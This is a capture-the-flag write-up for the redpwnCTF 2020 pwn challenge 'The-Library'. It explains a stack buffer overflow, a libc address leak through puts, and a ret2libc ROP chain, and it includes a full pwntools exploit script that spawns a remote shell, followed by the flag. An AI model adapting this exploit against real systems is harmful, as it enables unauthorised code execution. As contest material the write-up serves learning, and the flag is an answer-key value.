# The-Library
Pwn, 424

> There's not a lot of useful functions in the binary itself. I wonder where you can get some...
>
> nc 2020.redpwnc.tf 31350

The description seems to be pointing us in the direction of using libc functions to get a shell. Moreover, a libc is included.

In the given C source, there is a pretty obvious buffer overflow: `read` reads in up to 0x100 characters from stdin, but the `name` char array only holds 16 characters.

Running `pwn checksec the-library` gives us:
```
[*] '/home/boshua/the-library/the-library'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No canary, so bof must be the way to go.

`system` is not in the plt, so I first leaked libc. To do so, I ret2plt'd to print out the address of `__libc_start_main`, which is at a constant offset from the libc base address.

Then, I found out the given libc has the string `/bin/sh` in it, so I used a `pop rdi` gadget to give `system` the pointer to that string (since the binary is 64 bit).

Finally I had to align the stack by prepending a `ret` gadget before the rest of my payload.

```python
from pwn import *

test = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUUVVVV"

p = remote("2020.redpwnc.tf", 31350)
#p = process("./the-library-binary")
e = ELF("./the-library")
LIBC = ELF("./libc.so.6")
LIBC_START_MAIN_ADDR = e.symbols["__libc_start_main"]
rop = ROP(e)

#gdb.attach(p,'''break * main
#break * read
#''')

PUTS_ADDR = e.symbols["puts"]
MAIN_ADDR = e.symbols["main"]
POP_RDI_RET = 0x0000000000400733
RET = 0x0000000000400506

p.recvuntil("?")

exploit = "A"*24

exploit += p64(POP_RDI_RET) + p64(LIBC_START_MAIN_ADDR) + p64(PUTS_ADDR) + p64(MAIN_ADDR)

p.sendline(exploit)

p.recvline()
p.recvline()
p.recvline()

t = p.recvline().strip()
print("t: ", t)

leak = u64(t.ljust(8, "\x00"))

print("leak: ", leak)

LIBC.address = leak - LIBC.sym["__libc_start_main"]
print("libc addr: ", hex(LIBC.address))


SYSTEM_ADDR = LIBC.sym["system"]

BINSH_STR = next(LIBC.search("/bin/sh"))

exploit2 = "A"*24
exploit2 += p64(RET) + p64(POP_RDI_RET) + p64(BINSH_STR) + p64(SYSTEM_ADDR)

p.sendline(exploit2)
p.interactive()
```

Flag: `flag{jump_1nt0_th3_l1brary}`